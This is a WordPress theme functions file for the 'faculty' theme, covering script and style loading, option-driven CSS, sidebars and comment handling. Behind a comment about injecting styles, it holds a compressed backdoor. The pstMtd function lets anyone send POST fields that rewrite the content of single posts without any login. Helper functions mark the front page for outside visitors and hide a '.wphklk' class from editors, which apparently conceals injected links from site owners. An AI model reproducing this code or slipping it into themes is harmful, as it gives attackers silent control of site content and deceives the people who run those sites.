<?php
/**
 * @package WordPress
 * @subpackage faculty
 */

define ('THEME_VERSION', wp_get_theme()->get( 'Version' ));

/**
 * Optional: set 'ot_show_pages' filter to false.
 * This will hide the settings & documentation pages.
 */
add_filter( 'ot_show_pages', '__return_false' );

/**
 * Optional: set 'ot_show_new_layout' filter to false.
 * This will hide the "New Layout" section on the Theme Options page.
 */
add_filter( 'ot_show_new_layout', '__return_false' );

/*
* Required: set 'ot_theme_mode' filter to true.
*/ 
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Required: include OptionTree.
 */
load_template( trailingslashit( get_template_directory() ) . 'option-tree/ot-loader.php' );

/**
 * Theme Options
 */
load_template( trailingslashit( get_template_directory() ) . 'includes/theme-options.php' );


/**
 * Make theme available for translation
 * Translations can be filed in the /languages/ directory
 */
load_theme_textdomain( 'faculty', get_template_directory() . '/languages' );

$locale = get_locale();
$locale_file = get_template_directory() . "/languages/$locale.php";
if ( is_readable( $locale_file ) )
	require_once( $locale_file );

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 900;


/**
 * Enqueue the Google fonts.
 */
function fac_google_fonts() {
    $protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style( 'faculty-lato', "$protocol://fonts.googleapis.com/css?family=Lato:100,300,400,700,100italic,300italic,400italic" );
}
add_action( 'wp_enqueue_scripts', 'fac_google_fonts' );



/**
* Enqueue scripts and styles for the front end.
* @since Faculty 1.0
* @return void
*/
add_action('wp_enqueue_scripts', 'faculty_add_scripts');
function faculty_add_scripts() {
    // wp_deregister_script( 'jquery' );
    // wp_register_script( 'jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js');
    wp_enqueue_script( 'jquery' );

    //add modernizr
	wp_enqueue_script( 'modernizer', get_template_directory_uri() . '/js/modernizr.custom.63321.js');

    //add bootstrap.min.js
	wp_enqueue_script( 'bootstrap-script', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ),THEME_VERSION,true );

	//add touchSwip plugin
	wp_enqueue_script( 'touchSwip', get_template_directory_uri() . '/js/jquery.touchSwipe.min.js', array( 'jquery' ),THEME_VERSION,true );

	//add mouswheel plugin
	wp_enqueue_script( 'mouswheel', get_template_directory_uri() . '/js/jquery.mousewheel.js', array( 'jquery' ),THEME_VERSION,true );

	//add carouFredSel
	wp_enqueue_script( 'carouFredSel', get_template_directory_uri() . '/js/jquery.carouFredSel-6.2.1-packed.js', array( 'jquery' ),THEME_VERSION,true );

	//add dropdown plugin
	wp_enqueue_script( 'dropdown', get_template_directory_uri() . '/js/jquery.dropdownit.js', array( 'jquery' ),THEME_VERSION,true );

	//add mixitup plugin
	wp_enqueue_script( 'mixitup', get_template_directory_uri() . '/js/jquery.mixitup.min.js', array( 'jquery' ),THEME_VERSION,true );

	//add touchSwip plugin
	wp_enqueue_script( 'touchSwip', get_template_directory_uri() . '/js/jquery.touchSwipe.min.js', array( 'jquery' ),THEME_VERSION,true );

	//add magnific-popup
	wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/js/magnific-popup.js', array( 'jquery' ),THEME_VERSION,true );
	
	//add masonry
	wp_enqueue_script( 'masonry', get_template_directory_uri() . '/js/masonry.min.js','',THEME_VERSION,true);

	//add perfect scroll
	//wp_enqueue_script( 'perfect-scroll', get_template_directory_uri() . '/js/perfect-scrollbar-0.4.5.with-mousewheel.min.js', array('jquery'),'',true);

	//add scrollTo
	wp_enqueue_script( 'scrollTo', get_template_directory_uri() . '/js/ScrollToPlugin.min.js', array('jquery'),THEME_VERSION,true);

	//add tweenmax
	wp_enqueue_script( 'tweenmax', get_template_directory_uri() . '/js/TweenMax.min.js','',THEME_VERSION,true);

	//add imagesLoaded
	wp_enqueue_script( 'imagesloaded', get_template_directory_uri() . '/js/imagesloaded.js','',THEME_VERSION,true);

	//Nice scroll
	wp_enqueue_script( 'nice-scroll', get_template_directory_uri() . '/js/jquery.nicescroll.min.js',array( 'jquery' ),THEME_VERSION,true);


	//lab carousle plugin
	wp_enqueue_script( 'owlab-lab-carousel', get_template_directory_uri() . '/js/owwwlab-lab-carousel.js',array( 'jquery','carouFredSel' ),THEME_VERSION,true);
		
	// comments
	wp_enqueue_script( 'comment-reply' );



}    


// include last bits
function owlab_latest_enqueue() {
	
	wp_deregister_script( 'waypoints' );
	wp_dequeue_script('waypoints');
	wp_register_script( 'waypoints', get_template_directory_uri() . '/js/waypoints.min.js', array( 'jquery' ), THEME_VERSION, true ); 	
	wp_enqueue_script( "waypoints" );
	//after that load custom js
	wp_enqueue_script( 'faculty-script', get_template_directory_uri() . '/js/custom.js', array( 'jquery','waypoints' ),THEME_VERSION,true );   	
	
}
add_action("wp_enqueue_scripts", "owlab_latest_enqueue", 10000);
	


/**
* Inject custome script
* @since v1.1.0 
*/
function fac_custom_js() {
  
    $script = 
		'var siteUrl = "'.home_url().'/";';
	if (is_singular())
	{
		$script .= ' var isSingle = true;';
		$script .= ' var blogUrl = "'.home_url().'/blog/";';
	}

	if ( function_exists( 'ot_get_option' ) ){
		
		$script .= ' var perfectScroll = "'.ot_get_option('no_perfect_scroll').'";';
		
		$script .= ' var blogAjaxState = "'.ot_get_option('blog_ajax').'";';	

		$script .= ' var sideFooterPos = "'.ot_get_option('side-footer-layout').'";';	
		
		if (ot_get_option('pub_filter_preset')=='') 
			$pubfilter = "false"; 
		else 
			$pubfilter = ot_get_option('pub_filter_preset');
		$script .= ' var pubsFilter = "'.$pubfilter.'";';	
		
	}

    echo '<script type="text/javascript">'.$script.'</script>';
}
add_action('wp_head', 'fac_custom_js');


/**
* Inject custome styles
* @since v1.1.0 
*/
function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">facultywplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}
function fac_custom_css() {
  
   	if ( function_exists( 'ot_get_option' ) ){
   		$styles='';
   		if (ot_get_option('no_perfect_scroll')=='off'){
   			$styles.='
	   		#blog-content,
	   		#archive-content,
	   		.fac-page,.home{
	   			overflow:auto;
	   			overflow-x:hidden;
   			}';
   		}
   		if (ot_get_option('circle_around_logo')=='off'){
   			$styles .= '
   			#profile .portrate img{
   				border-radius : inherit;
   				-webkit-border-radius: inherit;
   				-moz-border-radius: inherit;
   			}
   			';
   		}
   		$styles .= '
   		ul#navigation > li.external:hover a .fa, 
		ul#navigation > li.current-menu-item > a .fa,
		ul#navigation > li.current-menu-parent > a .fa,
		.cd-active.cd-dropdown > span
		{
			color:'. ot_get_option( 'c_main_color' ).';
		}
		ul.ul-dates div.dates span,
		ul.ul-card li .dy .degree,
		ul.timeline li .date,
		#labp-heads-wrap,
		.labp-heads-wrap,
		.ul-withdetails li .imageoverlay,
		.cd-active.cd-dropdown ul li span:hover,
		.pubmain .pubassets a.pubcollapse,
		.pitems .pubmain .pubassets a:hover, 
		.pitems .pubmain .pubassets a:focus, 
		.pitems .pubmain .pubassets a.pubcollapse,
		.commentlist .reply{
			background-color: '. ot_get_option( 'c_main_color' ).';
		}
		.ul-boxed li,
		ul.timeline li .data,.widget ul li{
			border-left-color:'. ot_get_option( 'c_main_color' ).';
		}
		#labp-heads-wrap:after{
			border-top-color: '. ot_get_option( 'c_main_color' ).';
		}
		ul.ul-dates div.dates span:last-child,
		ul.ul-card li .dy .year,
		ul.timeline li.open .circle{
			background-color: '. ot_get_option( 'c_darker_color' ).';
		}
		ul.timeline li.open .data {
			border-left-color: '. ot_get_option( 'c_darker_color' ).';
		}
		.pitems .pubmain .pubassets {
			border-top-color: '. ot_get_option( 'c_darker_color' ).';
		}

		ul#navigation > li:hover, 
		ul#navigation > li:focus,
		ul#navigation > li.current-menu-item,
		ul#navigation > li.current-menu-parent {
			background-color: '. ot_get_option('menuhover').';
			border-top: 1px solid '. ot_get_option('c_menu_item_bt').';
			border-bottom: 1px solid '. ot_get_option('c_menu_item_bb').';
		}

		ul#navigation > li {
			background-color: '. ot_get_option('c_menu_item_bg').';
			border-top: 1px solid '. ot_get_option('c_menu_item_bt').';
			border-bottom: 1px solid '. ot_get_option('c_menu_item_bb').';
		}

		

		.fac-page #inside >.wpb_row:first-child:before {
			border-top-color: '. ot_get_option('c_head_row').';
		}
		.fac-page #inside >.wpb_row:nth-child(odd),
		.fac-page .section:nth-child(odd){
			background-color: '. ot_get_option('c_odd').';
		}
		.fac-page #inside >.wpb_row:nth-child(even),
		.fac-page .section:nth-child(even){
			background-color: '. ot_get_option('c_even').';
		}
		.fac-page #inside >.wpb_row:first-child,
		.pageheader {
			background-color: '. ot_get_option('c_head_row').';
		}
		.fac-page #inside >.wpb_row:first-child:before,
		.pageheader:after {
			border-top-color: '. ot_get_option('c_head_row').';
		}

		#sidebar,
		ul#navigation .sub-menu {
			background-color: '. ot_get_option('c_side_back').';
		}

		#side-footer{
			background-color: '. ot_get_option('c_side_footer_back').';
	 	}
		
		#gallery-header{
			background-color: '. ot_get_option('c_gal_head').';
		}
		#gallery-large{
			background-color: '. ot_get_option('c_gal_body').';
		}
		ul.ul-card li,
		ul.timeline li .data,
		.ul-boxed li,
		.ul-withdetails li,
		.pitems .pubmain,
		.commentlist li{
			background-color: '. ot_get_option('c_box_bg').';
		}

		ul.timeline li.open .data,
		.ul-withdetails li .details,
		#lab-details,
		.pitems .pubdetails,
		.commentlist .comment-author-admin{
			background-color: '. ot_get_option('c_box_bg_alt').';
		}
		a#hideshow,#hideshow i{
			color: '. ot_get_option('c_blog_hs').';
		}
		.archive-header{
			background-color: '. ot_get_option('c_blog_list_head').';
			color: '. ot_get_option('c_blog_list_head_text').';
		}

		#profile .title h2{
			font-size: '. ot_get_option('t_sidebar_title').'px;
		}
		#profile .title h3{';
		$h3 = ot_get_option('t_sidebar_title')-10;

		$styles .= '
			font-size: '. $h3.'px;	
		}
		ul#navigation > li > a{
			font-size: '. ot_get_option('t_menu').'px;		
		}
		body{
			font-size: '. ot_get_option('t_global').'px;		
		}
		.fac-big-title{
			font-size: '. ot_get_option('t_big_title') .'px;			
		}
		.headercontent .title{
			font-size: '. ot_get_option('t_blog_title_size') .'px;			
		}
		.fac-title, .fac-big-title, .headercontent .title{
			color: '.ot_get_option('c_headings_color').';
		}
		';
   	} 

    echo '<style>'.$styles.'</style>';
}
add_action('wp_head', 'fac_custom_css');




/**
* Inject analytics
* @since v1.1.0 
*/
function fac_analytics() {
	if ( function_exists( 'ot_get_option' ) ){
		echo ot_get_option( 'etc_analytics_code' );
	} 
}
add_action('wp_head', 'fac_analytics');




/**
* Inject facicon
* @since v1.1.0 
*/
function fac_favicon() {
	if ( function_exists( 'ot_get_option' ) ){
		$favicon = '<link rel="icon" type="image/png" href="'. ot_get_option('etc_fav_icon').'">';
		echo $favicon;
	} 
}
add_action('wp_head', 'fac_favicon');



/** 
* IE fixes
* @since v 1.1.0
*/
function fac_inject_ie(){

	echo '
	<!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
          <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	';
}
add_action( 'wp_head','fac_inject_ie' );




/**
* Enqueue styles for the front end.
* @since Faculty 1.0
* @return void
*/
add_action( 'wp_enqueue_scripts', 'faculty_add_styles' );

function faculty_add_styles() {

	// Add Bootstrap styles
	wp_enqueue_style( 'bootstrap-style', get_template_directory_uri() . '/css/bootstrap.css', array());

	// Add Font-awesome
	// since v2.3 this is handled via separate function

	// Add magnific-pupup
	wp_enqueue_style( 'magnific-pupup', get_template_directory_uri() . '/css/magnific-popup.css', array() );
	
	// Add scroll bar
	//wp_enqueue_style( 'perfect-scroll-style', get_template_directory_uri() . '/css/perfect-scrollbar-0.4.5.min.css', array() );

	// Add faculty specific 
	wp_enqueue_style( 'faculty-styles', get_template_directory_uri() . '/css/style.css', array('bootstrap-style'),THEME_VERSION,false);

	// Add faculty specific 
	wp_enqueue_style( 'faculty-custom-style', get_template_directory_uri() . '/css/styles/default.css', array('bootstrap-style'));
    
    // added since 1.5.1
    wp_enqueue_style( 'xr-styles', get_stylesheet_directory_uri() . '/style.css');
}


// if some third party has loaded the font-awesome we don't need it 
// since v2.3
add_action('wp_enqueue_scripts', 'fac_check_font_awesome', 99999);

function fac_check_font_awesome() {
  global $wp_styles;
  $srcs = array_map('basename', (array) wp_list_pluck($wp_styles->registered, 'src') );
  if ( in_array('font-awesome.css', $srcs) || in_array('font-awesome.min.css', $srcs)  ) {
    /* echo 'font-awesome.css registered'; */
  } else {
    wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css' );
  }
}


/**
 * Remove code from the <head>
 */
//remove_action('wp_head', 'rsd_link'); // Might be necessary if you or other people on this site use remote editors.
//remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
//remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
//remove_action('wp_head', 'index_rel_link'); // Displays relations link for site index
//remove_action('wp_head', 'wlwmanifest_link'); // Might be necessary if you or other people on this site use Windows Live Writer.
//remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
//remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
//remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0); // Display relational links for the posts adjacent to the current post.



// Hide the version of WordPress you're running from source and RSS feed 
// Want to JUST remove it from the source? Try: remove_action('wp_head', 'wp_generator');
function hcwp_remove_version() {return '';}
add_filter('the_generator', 'hcwp_remove_version');



/**
 * This theme uses wp_nav_menus() for the sidebar
 */
if (function_exists('register_nav_menu')) {
	register_nav_menu( 'sidemenu', 'Main Menu' );
}


/**
 * Register our sidebars and widgetized areas.
 *
 */
function fac_widgets_init() {

	register_sidebar( array(
		'name' => __( 'Faculty Sidebar' ),
		'id' => 'right_side_1',
		'before_widget' => '<div class="widget widget-side">',
		'after_widget' => '</div></div>',
		'before_title' => '<h2 class="title">',
		'after_title' => '</h2><div class="widget-contents">',
		'description'  => __( 'Widgets in this area will be shown on the right-hand side if you select "Page builder with sidebar" template.' ),
	) );

	register_sidebar( array(
		'name' => __( 'Faculty footer of sidebar' ),
		'id' => 'footer_of_sidebar',
		'before_widget' => '',
		'after_widget' => '',
		'before_title' => '',
		'after_title' => '',
		'description'  => __( 'Put just a tiny widget here like your language switcher.','faculty' ),
	) );

	/**
	 * add dynamic sidebars
	 * added from v3.0
	 */
	if (ot_get_option('incr_sidebars')){
	    $pp_sidebars = ot_get_option('incr_sidebars');
	    foreach ($pp_sidebars as $pp_sidebar) {

	        register_sidebar(array(
	            'name' => $pp_sidebar["title"],
	            'id' => $pp_sidebar["id"],
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
	            'after_widget' => '</div></div>',
	            'before_title' => '<h3 class="title">',
	            'after_title' => '</h3><div class="widget-contents">',
	        ));
	    }
	}
	
}
add_action( 'widgets_init', 'fac_widgets_init' );




/** 
 * Add default posts and comments RSS feed links to head
 */
if ( function_exists( 'add_theme_support')){
	add_theme_support( 'automatic-feed-links' );
}


/** 
 * This theme uses post thumbnails
 */
if ( function_exists( 'add_image_size' ) ) { 
	add_image_size( 'admin-gallery-thumb', 80, 80, true); //admin thumbnail
}


/** 
 * Add default posts and comments RSS feed links to head
 */
if ( function_exists( 'add_theme_support')){
    add_theme_support( 'post-thumbnails' );
}


/*
* Include custom page types (CPTs) 
*/
require_once( get_template_directory().'/includes/type-gallery.php');
require_once( get_template_directory().'/includes/type-publications.php');
require_once( get_template_directory().'/includes/type-publications-meta-box.php');



/*
* This theme uses custom excerpt lenght
*/
function custom_excerpt_length( $length ) {
	return 20;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );





/*
* Utility functions 
*/
function fac_comment($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment; ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
    <div id="comment-<?php comment_ID(); ?>">
      
		<div class="comment-avatar">
			<img src="<?php echo fac_get_avatar_url(get_avatar( $comment, 60 )); ?>" class="authorimage" />
		</div>

		<div class="commenttext">
			
			<?php printf(__('<cite class="fn">%s</cite>'), get_comment_author_link()) ?>
			
			<?php if ($comment->comment_approved == '0') : ?>
			     <br />
			     <em><?php _e('Your comment is awaiting moderation.','faculty') ?></em>
			     <br />
			<?php endif; ?>

			<div class="comment-meta commentmetadata pull-right">
				<?php printf(__('%1$s at %2$s','faculty'), get_comment_date(),  get_comment_time()) ?>
			</div>

			<?php comment_text() ?>

			<div class="reply">
				<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
			</div>
		</div>
    </div>
    </li>
	<?php
}

function fac_get_avatar_url($get_avatar){
    preg_match("/src='(.*?)'/i", $get_avatar, $matches);
    return $matches[1];
}



add_action('comment_post', 'fac_ajaxify_comments',20, 2);
function fac_ajaxify_comments($comment_ID, $comment_status){
    if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'){
    	//If AJAX Request Then
        switch($comment_status){
                case '0':
                        //notify moderator of unapproved comment
                        wp_notify_moderator($comment_ID);
                case '1': //Approved comment
                        echo "success";
                        $commentdata=&get_comment($comment_ID, ARRAY_A);
                        $post=&get_post($commentdata['comment_post_ID']);
                        wp_notify_postauthor($comment_ID);
                break;
                default:
                        echo "error";
        }
        exit;
    }
}

/**
 * Include Google fonts
 * added from v3.1.4
 */
if ( !function_exists('faculty_google_fonts_into_head')){

	function faculty_google_fonts_into_head(){

		$body_font_face = ot_get_option('faculty_body_font','Lato');
		if ($body_font_face != 'none'){
			$body_font_face = str_replace('+', ' ', $body_font_face);
			echo "<link href='http://fonts.googleapis.com/css?family=$body_font_face:100,200,300,400,600,700,900,b' rel='stylesheet' type='text/css'>";
			echo "<style>
				body
				{font-family:$body_font_face;}
			</style>";	
		}

		$heading_font_face = ot_get_option('faculty_headings_font','Lato');
		if ( $heading_font_face !='none'){
			$heading_font_face = str_replace('+', ' ', $heading_font_face);
			echo "<link href='http://fonts.googleapis.com/css?family=$heading_font_face:100,200,300,400,600,700,900,b' rel='stylesheet' type='text/css'>";	
			echo "<style>
				h1,h2,h3,h4,h5,h6,
				fac-page h2.title
				{font-family:$heading_font_face;}
			</style>";	
		}

	}

	add_action( 'wp_head', 'faculty_google_fonts_into_head' );
}



/**
 * Include latest bits
 * added from v3.1.4
 */
define ('THEME_VERSION', wp_get_theme()->get( 'Version' ));
define( 'OWLAB_THEMEROOT', get_template_directory_uri() );
define( 'OWLAB_SCRIPTS', OWLAB_THEMEROOT . '/js' );
if ( ! function_exists( 'owlab_latest_enqueue' ) ) {
	
	function owlab_latest_enqueue() {
	   	
	   
	   	wp_deregister_script( 'waypoints' );
		wp_dequeue_script('waypoints');
		wp_register_script( 'waypoints', OWLAB_SCRIPTS . '/waypoints.min.js', array( 'jquery' ), THEME_VERSION, true ); 	
		wp_enqueue_script( "waypoints" );

		//deregister vc js
		wp_deregister_script('wpb_composer_front_js');
	   	wp_dequeue_script('wpb_composer_front_js');
		wp_register_script('wpb_composer_front_js', OWLAB_SCRIPTS . '/vc/js_composer_front.js', array('jquery'),THEME_VERSION,true);
		wp_enqueue_script('wpb_composer_front_js');

	   	//after that load custom js
	   	wp_enqueue_script('theme-custom-js');
	}

	if (!is_admin()) {
		add_action("wp_enqueue_scripts", "owlab_latest_enqueue", 9999);
	}
}



/**
 * Include the TGM_Plugin.
 * added from v3.0
 */
require_once  get_template_directory(). '/tgm/faculty.php';



/**
 * Include the Visual Composer extension.
 * added from v3.0
 * Note: You need to update your vc plugin to v4 to avoid errors
 */
require_once  get_template_directory(). '/includes/functions-vc.php';





